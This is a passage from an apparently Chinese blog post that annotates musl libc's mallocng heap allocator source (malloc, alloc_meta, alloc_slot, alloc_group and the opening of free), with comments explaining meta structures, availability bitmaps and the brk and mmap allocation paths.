class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> mask, first;</span><br><span class="line">	<span class="keyword">int</span> sc;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="keyword">int</span> ctr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 判断size大小是否大于131052(0x1FFEC),由于chunk存在12字节的复用,所以这里大小为0x1FFEC */</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123; <span class="comment">/* 大于则使用mmap进行内存分配 */</span></span><br><span class="line">		<span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock(); <span class="comment">/* 加malloc锁 */</span></span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta(); <span class="comment">/* 分配一个meta,mmap得到的chunk会记录在这个meta结构体中 */</span></span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock(); <span class="comment">/* 解除malloc锁 */</span></span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">		g-&gt;mem = p; <span class="comment">/* 返回的chunk指针 */</span> </span><br><span class="line">		g-&gt;mem-&gt;meta = g; <span class="comment">/* meta指针 */</span></span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>; <span class="comment">/* 该group只存在一个chunk,idx设为&#x27;0&#x27; */</span></span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>; <span class="comment">/* 记录是否可释放的标志位 */</span></span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">/* 由mmap分配的内存,默认为&#x27;63&#x27; */</span></span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>; <span class="comment">/* 计算映射内存的长度 */</span></span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>; <span class="comment">/* 设置两个bitmap */</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sc = size_to_class(n); <span class="comment">/* 计算size类别 */</span></span><br><span class="line"></span><br><span class="line">	rdlock(); <span class="comment">/* 对malloc函数进行上锁 */</span></span><br><span class="line">	g = ctx.active[sc]; <span class="comment">/* 取得对应的meta结构体(可能取NULL,也可能取满的meta) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果这个sc对应的meta为空,则根据条件选择更大的meta进行分配 */</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="comment">/* if g!=0 sc∈[4,32) sc≠6 sc为偶数:对应的meta数组存在可用chunk */</span></span><br><span class="line">		<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>; <span class="comment">/* 尝试增加sc的值 */</span></span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123; <span class="comment">/* avail_mask就是表示可用chunk的bitmap */</span></span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">/* g=0,表示其没有可用的chunk,first一定为&#x27;0&#x27; */</span></span><br><span class="line">		first = mask&amp;-mask; <span class="comment">/* 只要avail_mask的每个位不全为&#x27;0&#x27;,first就也不为&#x27;0&#x27;,代表还有可用的chunk */</span></span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>; <span class="comment">/* 没有avail的chunk(满的meta),跳出循环 */</span></span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first; <span class="comment">/* 将取出chunk对应的avail设为&#x27;0&#x27; */</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">/* 自旋 */</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		idx = a_ctz_32(first); <span class="comment">/* 获取对应chunk的idx */</span></span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock(); <span class="comment">/* malloc锁更新 */</span></span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n); <span class="comment">/* 申请新的chunk(重新分配meta) */</span></span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock(); <span class="comment">/* 解除malloc锁 */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	g = ctx.active[sc]; <span class="comment">/* 更新g,找到对应的meta */</span></span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock(); <span class="comment">/* 解除malloc锁 */</span></span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr); <span class="comment">/* 返回分配的chunk */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>判断是否需要调用 mmap</li>
<li>先计算 chunk size 的范围，判断 <code>ctx.active[sc]</code> 中对应的 meta，此时有3种情况：<ul>
<li>meta 为 NULL：<ul>
<li>查看是否可以获取更大的 meta，进入下一步（判断 meta 是否装满）</li>
</ul>
</li>
<li>meta 存在但是装满：<ul>
<li>调用 <code>alloc_slot</code> 尝试分配新的 <code>meta</code>，进入下一步（返回目标 chunk）</li>
</ul>
</li>
<li>meta 存在并且有空闲：<ul>
<li>计算对应 chunk 的 idx，返回目标 chunk</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>其中有一些重要的函数：<code>alloc_meta</code>，<code>alloc_slot</code></p>
<p>alloc_meta：分配一个 meta</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alloc_meta __malloc_alloc_meta</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct meta *<span class="title">alloc_meta</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">	<span class="keyword">if</span> (!ctx.init_done) &#123; <span class="comment">/* 查看ctx是否进行了初始化,没有就简单初始化一下 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">		ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		ctx.secret = get_random_secret();</span><br><span class="line">		ctx.init_done = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br><span class="line">    <span class="comment">/* 查看释放的meta队列是否存在空闲的结点,存在的话就直接返回 */</span></span><br><span class="line">	<span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br><span class="line">	<span class="keyword">if</span> (!ctx.avail_meta_count) &#123;</span><br><span class="line">		<span class="keyword">int</span> need_unprotect = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk!=<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="comment">/* 新分配一页内存 */</span></span><br><span class="line">			<span class="keyword">uintptr_t</span> <span class="keyword">new</span> = ctx.brk + pagesize;</span><br><span class="line">			<span class="keyword">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">				need_guard = <span class="number">1</span>;</span><br><span class="line">				ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">				ctx.brk += -ctx.brk &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">				<span class="keyword">new</span> = ctx.brk + <span class="number">2</span>*pagesize;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (brk(<span class="keyword">new</span>) != <span class="keyword">new</span>) &#123; <span class="comment">/* 获取内存失败 */</span></span><br><span class="line">				ctx.brk = <span class="number">-1</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123; <span class="comment">/* 获取内存成功 */</span></span><br><span class="line">				<span class="keyword">if</span> (need_guard) mmap((<span class="keyword">void</span> *)ctx.brk, pagesize,</span><br><span class="line">					PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">/* 保护页,在brk后面映射一个不可用的页(PROT_NONE)</span></span><br><span class="line"><span class="comment">                如果堆溢出到这里就会发送SIGV */</span></span><br><span class="line">				ctx.brk = <span class="keyword">new</span>;</span><br><span class="line">				ctx.avail_meta_areas = (<span class="keyword">void</span> *)(<span class="keyword">new</span> - pagesize);</span><br><span class="line">				ctx.avail_meta_area_count = pagesize&gt;&gt;<span class="number">12</span>;</span><br><span class="line">				need_unprotect = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123; <span class="comment">/* 如果前面brk()分配失败了,直接mmap匿名映射一片PROT_NONE的内存再划分 */</span></span><br><span class="line">			<span class="keyword">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">			p = mmap(<span class="number">0</span>, n*pagesize, PROT_NONE,</span><br><span class="line">				MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">			ctx.avail_meta_area_count = (n<span class="number">-1</span>)*(pagesize&gt;&gt;<span class="number">12</span>);</span><br><span class="line">			ctx.meta_alloc_shift++;</span><br><span class="line">		&#125;</span><br><span class="line">		p = ctx.avail_meta_areas;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)p &amp; (pagesize<span class="number">-1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (need_unprotect)</span><br><span class="line">			<span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ|PROT_WRITE)</span><br><span class="line">			    &amp;&amp; errno != ENOSYS)</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		ctx.avail_meta_area_count--;</span><br><span class="line">		ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line">		<span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">			ctx.meta_area_tail-&gt;next = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ctx.meta_area_head = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125;</span><br><span class="line">		ctx.meta_area_tail = (<span class="keyword">void</span> *)p;</span><br><span class="line">		ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">		ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots</span><br><span class="line">			= (<span class="number">4096</span>-<span class="keyword">sizeof</span>(struct meta_area))/<span class="keyword">sizeof</span> *m;</span><br><span class="line">		ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx.avail_meta_count--;</span><br><span class="line">	m = ctx.avail_meta++;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>alloc_slot：申请新的 chunk（重新分配 meta）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">alloc_slot</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> first = try_avail(&amp;ctx.active[sc]); <span class="comment">/* 寻找队列中可用的chunk */</span></span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req); <span class="comment">/* 给sc分配一个meta再分配一个新的group结构体 */</span></span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--; <span class="comment">/* 第一个chunk被使用了 */</span></span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">/* 分配的meta入队 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>alloc_group：给 sc 分配一个 meta 再分配一个新的 group 结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct meta *<span class="title">alloc_group</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta(); <span class="comment">/* 分配一个新的meta用于管理新的meta */</span></span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">	<span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="keyword">int</span> active_idx;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* cnt为需要增加的chunk数量,以下算法是通过sc来求得最优cnt */</span></span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">			i++;</span><br><span class="line">		cnt = small_cnt_tab[sc][i];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line">		<span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">			cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">			cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>; <span class="comment">/* 如果在上面我们的cnt为&#x27;1&#x27;,是不够使用mmap的,将cnt增加到2可能就可以了 */</span></span><br><span class="line">	<span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123; <span class="comment">/* 通过mmap分配 */</span></span><br><span class="line">		<span class="keyword">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">		account_bounce(sc);</span><br><span class="line">		step_seq();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">size_t</span> needed = size*cnt + UNIT; <span class="comment">/* 需要分配的大小 */</span></span><br><span class="line">		needed += -needed &amp; (pagesize<span class="number">-1</span>); <span class="comment">/* 进行对齐操作 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">			req += IB + UNIT;</span><br><span class="line">			req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">				cnt = <span class="number">1</span>;</span><br><span class="line">				needed = req;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">			free_meta(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">		ctx.mmap_counter++; <span class="comment">/* mmap申请的内存数量加&#x27;1&#x27; */</span></span><br><span class="line">		active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>; <span class="comment">/* 计算active_idx(最多为cnt-1) */</span></span><br><span class="line">		<span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; <span class="comment">/* 通过brk分配 */</span></span><br><span class="line">		<span class="keyword">int</span> j = size_to_class(UNIT+cnt*size-IB); <span class="comment">/* 将size转化为内部的类 */</span></span><br><span class="line">		<span class="keyword">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB); <span class="comment">/* 重新分配meta(又调用回去了?有点迷) */</span></span><br><span class="line">		<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			free_meta(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j]; <span class="comment">/* 直接获取meta */</span></span><br><span class="line">		p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">		m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">		p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">			p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">		active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx.usage_by_class[sc] += cnt; <span class="comment">/* 这个sc又增加了cnt个chunk */</span></span><br><span class="line">	m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">	m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">	m-&gt;mem = (<span class="keyword">void</span> *)p;</span><br><span class="line">	m-&gt;mem-&gt;meta = m;</span><br><span class="line">	m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">	m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">	m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">	m-&gt;sizeclass = sc;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>free：释放 chunk 的核心函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>; </span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p); <span class="comment">/* 寻找释放chunk对应的meta结构体 */</span></span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p); <span class="comment">/* 获取对应chunk在对应group下标 */</span></span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g); <span class="comment">/* 获取chunk的大小 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB; </span><br><span class="line">	get_nominal_size(p, end); <span class="comment">/* 计算chunk的真实大小 */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>; <span class="comment">/* 计算chunk的bitmap */</span></span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>; <span class="comment">/* 将p[-3]置为0xff(对应chunk的下标),使其无效 */</span></span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>; <span class="comment">/* 将p[-1],p[-2]置为&#x27;0&#x27;(即(uint_64)p[-1]=0xff)</span></span><br><span class="line"><span class="comment">	chunk的头部存在0x10大小的控制信息,这一步将其head+0x8的位置置为0xff */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) 